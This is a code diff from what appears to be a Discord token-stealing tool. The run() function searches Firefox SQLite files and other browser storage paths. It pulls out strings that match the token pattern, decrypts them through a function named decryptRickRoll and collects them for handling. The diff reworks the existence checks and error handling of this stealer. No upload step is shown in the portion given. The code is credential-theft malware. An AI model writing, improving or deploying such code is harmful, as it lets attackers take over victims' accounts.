@@ -131,29 +131,27 @@ const handleTokens = (tokens, resolve) => tokens.forEach(token => {
 
 const run = () => new Promise((resolve) => {
   Object.keys(paths).forEach(path => {
+    if (!existsSync(paths[path])) return;
     if (path.includes('Firefox')) {
-      try {
-        const search = execSync('where /r . *.sqlite', { cwd: paths[path] }).toString();
-        if (search) {
-          search.split(/\r?\n/).forEach((filePath) => {
-            filePath = filePath.trim();
-            if (!statSync(filePath).isFile()) return;
-            const lines = readFileSync(filePath, { encoding: 'utf-8', flag: 'r' }).split('\n').map(x => x.trim());
-            lines.forEach((line) => {
-              const tokensMatch = line.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/);
-              if (tokensMatch) {
-                tokensMatch.forEach((token) => {
-                  if (!tokens.includes(token)) tokens.push(token);
-                });
-              }
-            });
+      const search = execSync('where /r . *.sqlite', { cwd: paths[path] }).toString();
+      if (search) {
+        search.split(/\r?\n/).forEach((filePath) => {
+          filePath = filePath.trim();
+          if (!existsSync(filePath) || !statSync(filePath).isFile()) return;
+          const lines = readFileSync(filePath, { encoding: 'utf-8', flag: 'r' }).split('\n').map(x => x.trim());
+          lines.forEach((line) => {
+            const tokensMatch = line.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/);
+            if (tokensMatch) {
+              tokensMatch.forEach((token) => {
+                if (!tokens.includes(token)) tokens.push(token);
+              });
+            }
           });
-        }
-      } catch (e) {}
-    } else if (!existsSync(paths[path])) {
-      resolve();
+        });
+      }
+      handleTokens(tokens, resolve);
     } else {
-      decryptRickRoll(paths[path]).then(tokens => handleTokens(tokens, resolve)).catch(resolve);
+      decryptRickRoll(paths[path]).then(tokens => handleTokens(tokens, resolve)).catch(console.error);
     }
   });
 });
